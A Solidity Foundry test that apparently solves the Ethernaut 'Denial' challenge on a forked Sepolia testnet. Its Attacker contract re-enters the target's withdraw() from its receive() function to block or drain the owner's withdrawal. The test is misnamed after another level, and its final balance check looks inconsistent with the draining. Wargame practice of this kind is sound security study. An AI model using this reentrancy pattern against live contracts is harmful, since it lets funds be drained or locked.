// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";


interface Denial {
    function owner() external view returns (address);
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
    function contractBalance() external view returns (uint);
}


contract Attacker{
    uint initialBalance;
    constructor(uint _initialBalance){
        initialBalance = _initialBalance;
    }
    receive() external payable{
        Denial d = Denial(msg.sender);
        if (d.contractBalance() > initialBalance / 100) {
            d.withdraw();
        }
    }
}

contract AlienCodexTest is Test {
    Denial denial;
    function setUp() public{
        vm.createSelectFork("sepolia", 5440843);
        denial = Denial(0x3a13c839f97C7812dc0eA73A6433EBB0DB6DE273);
    }
    function test_denial() public{
        uint balanceBefore = denial.contractBalance();
        address attacker = address(new Attacker(balanceBefore));
        denial.setWithdrawPartner(attacker);

        vm.prank(denial.owner());
        // vm.expectRevert();
        console.log("user.balance before", attacker.balance);
        console.log("owner.balance before", denial.owner().balance);
        denial.withdraw();
        uint balanceAfter = denial.contractBalance();
        console.log("owner.balance after", denial.owner().balance);
        console.log("user.balance after", attacker.balance);
        require(balanceBefore == balanceAfter, "Withdraw should fail");

    }
}
